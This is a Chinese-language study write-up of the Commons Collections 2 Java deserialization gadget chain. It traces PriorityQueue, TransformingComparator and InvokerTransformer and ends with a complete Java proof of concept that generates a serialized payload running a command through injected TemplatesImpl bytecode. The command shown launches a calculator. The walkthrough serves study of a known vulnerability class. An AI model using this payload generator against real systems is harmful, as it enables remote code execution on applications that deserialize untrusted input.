一，链条总览

PriorityQueue.readObject()

->heapify()

-><font style="color:#080808;background-color:#ffffff;">siftDownUsingComparator()</font>

<font style="color:#080808;background-color:#ffffff;">->TransformingComparator.compare()</font>

<font style="color:#080808;background-color:#ffffff;">->transformer.transform</font>

<font style="color:#080808;background-color:#ffffff;">->ChinedTransformer.transform()</font>

<font style="color:#080808;background-color:#ffffff;">->字节码加载</font>

二，分析

<!-- 这是一张图片，ocr 内容为：0个用法 @JAVA.IO.SERIAL WRITEOBJECT(JAVA.IO.OBJECTOUTPUTSTREAM S) PRIVATE VOID JAVA.IO.IOEXCEPTION { THROWS D ANY HIDDEN STUFF // WRITE OUT ELEMENT COUNT, AND ANY S.DEFAULTWRITEOBJECT(); // WRITE OUT ARRAY LENGTH, FOR COMPATIBILITY WITH 1.5 VERSION S.WRITEINT(MATH.MAX(2, SIZE + 1)); " WRITE OUT ALL ELEMENTS IN THE "PROPER ORDER". FINAL OBJECT[] ES - QUEUE; FOR (INT I - O, N - SIZE; I < N; I++) S.WRITEOBJECT(ES[I]); 子 水水 -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1784043702175-b905c90b-1317-4786-9c3d-b1cd369a71d4.png)

根据网上文章，cc2 主要利用了 PriorityQueue 这个类，首先可以想一下这个类的反序列化会执行什么样的操作，他想要干嘛

这边先不看反序列化方法转而先看序列化方法，在进行序列化时主要保存了三个属性： 数组中的元素（通过循环手动 writeObject）、数组大小 size、comparator；queue 数组本身是 transient，不会被 defaultWriteObject 默认序列化。  <!-- 这是一张图片，ocr 内容为：VOID READOBJECT(JAVA.IO.OBJECTINPUTSTREAM PRIVATE THROWS JAVA.IO.IOEXCEPTION, CLASSNOTFOUNDEXCEPTION // READ IN SIZE, AND ANY HIDDEN STUFF S.DEFAULTREADOBJECT(); " READ IN (AND DISCARD) ARRAY LENGTH S.READINT(); OBJECT[].CLASS, SIZE); CHECKARRAY(S, SHAREDSECRETS.GETJAVAOBJECTINPUTSTREAMACCESS()  FINAL OBJECT[] ES - QUE - NEW OH OBJECT[MATH.MAX(SIZE, 1)]; // READ IN ALL ELEMENTS. O, N - SIZE; I < N; I++) FOR (INT I - O, S.READOBJECT(); ES[I] 1/ ELEMENTS ARE GUARANTEED TO BE IN "PROPER ORDER", BUT THE // SPEC HAS NEVER EXPLAINED WHAT THAT MIGHT BE. HEAPIFY(); -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1784044101174-d4200225-abf4-485c-9951-16b535ca17ae.png)在进行反序列化时 jdk 一定会恢复最小堆的数据结构，，那他在恢复堆结构时会不会依赖用户输入的方法？

<!-- 这是一张图片，ocr 内容为：PRIVATE VOID HEAPIFY(){ 3个用法 FINAL OBJECT[] ES QUEUE, (N >>> 1) - 1; I INT N - SIZE, FINAL COMPARATOR<? SUPER E> CMP; S COMPARATOR) -- NULL) IF (CMP FOR(; I > 0; I---)  SIFTDOWNCOMPARABLE(I, (E) ES[I], ES, N); ELSE FOR (; I > 0; I--) SIFTDOWNUSINGCOMPARATOR(I,(E) ES[I], ES, N, CMP); -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1784044187769-8ddcc83a-8317-48f4-9cfe-e5be3591dfc5.png)

跟进 heapify 方法，

这里检查了 comparator 是否为空，comparator 也就是比较器，在进行最小堆数据结构的分析时，肯定要对元素进行比较，那么 comparator 是否可控？

<!-- 这是一张图片，ocr 内容为：PUBLIC PRIORITYQUEUE(INT INITIALCAPACITY,0个用法 COMPARATOR<? SUPER E> COMPARATOR) { NOTE: THIS RESTRICTION OF AT LEAST ONE IS NOT ACTUALLY NEEDED, // BUT CONTINUES FOR 1.5 COMPATIBILITY IF (INITIALCAPACITY < 1) THROW NEW ILLEGALARGUMENTEXCEPTION(); OBJECT[INITIALCAPACITY]; THIS.QUEUE 三 NEW THIS.COMPARATOR COMPARATOR; -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1784044405563-a2add7b1-610d-41d8-a359-114a230e755d.png)

查看构造方法，comparator 明显为用户可控

<!-- 这是一张图片，ocr 内容为：3个用法 STATIC <T> VOID SIFTDOWNUSINGCOMPARATOR( PRIVATE COMPARATOR<? SUPER T> CMP){  INT K, T X, OBJECT[] ES, INT N, N, // ASSERT N > INT HALF - N >> 1; WHILE (K < HALF) { INT CHILD (K < 1) + 1; ES[CHILD]; OBJECT C ES INT RIGHT - CHILD + 1; IF (RIGHT < N & CMP && CMP.COMPARE((T) C,(T) ES[RIGHT]) > O) RIGHT]; C ES[CHILD (T) C) < 0) IF OMPARE(X CMP. BREAK; ES[K] C; K - CHILD; 子 ES[K] X; -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1784044765405-9f136dec-dccc-49e3-90be-3eb233e255ab.png)

继续跟进siftDownUsingComparator 方法，真正进行最小堆结构恢复逻辑的地方，每次 选择左右孩子中较小 的值，与当前节点比较，当前节点更大的话则交换，使大节点不断下沉，在这儿过程中调用了节点元素的 compare 方法

<!-- 这是一张图片，ocr 内容为：T COMPARE(FINAL I OBJL, FINAL I OBJ2) { PUBLIC INT CO THIS.TRANSFORMER.TRANSFORM(OBJ1); FINAL O VALUEL THIS.TRANSFORMER.TRANSFORM(OBJ2); FINAL O VALUE2 RETURN THIS.DECORATED.COMPARE(VALUEL, VALUE2); -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1784044928771-dd70f653-8137-40a7-b7b7-a2dd8b6e0311.png)

转到 TransformingComparator 类的 compare 方法，compare() 会先对待比较的两个对象分别执行 transformer.transform()，再对转换后的结果进行比较。  

直接上代码：

```java
package org.cc.repro.cc2;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class App {
    public static void main(String[] args) throws Exception {
        // ================= 1. 生成恶意字节码（使用 Javassist） =================
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("Evil_" + System.nanoTime()); // 新类名
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass); // 设置父类

        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        clazz.makeClassInitializer().insertBefore(cmd);
        byte[] bytecode = clazz.toBytecode();

        // ================= 2. 构造 TemplatesImpl 并注入字节码 =================
        TemplatesImpl templates = new TemplatesImpl();

        Field bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates, new byte[][]{bytecode});

        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "test");

        // ★ 重要：设置 _tfactory，避免反序列化时 NPE
        Field tfactoryField = TemplatesImpl.class.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl());

        Transformer fakeTransformer = new ConstantTransformer(1);
        TransformingComparator comparator = new TransformingComparator<>(fakeTransformer);

        PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
        queue.add(1);
        queue.add(1);

        Field queueField = PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        Object[] queueArray = (Object[]) queueField.get(queue);
        queueArray[0] = templates;
        queueArray[1] = templates;

        InvokerTransformer realTransformer = new InvokerTransformer(
                "newTransformer", new Class[0], new Object[0]
        );
        Field transformerField = TransformingComparator.class.getDeclaredField("transformer");
        transformerField.setAccessible(true);
        transformerField.set(comparator, realTransformer);

        String filename = "cc2.ser";
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filename))) {
            oos.writeObject(queue);
        }

        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename))) {
            ois.readObject();
        }
    }
}
```

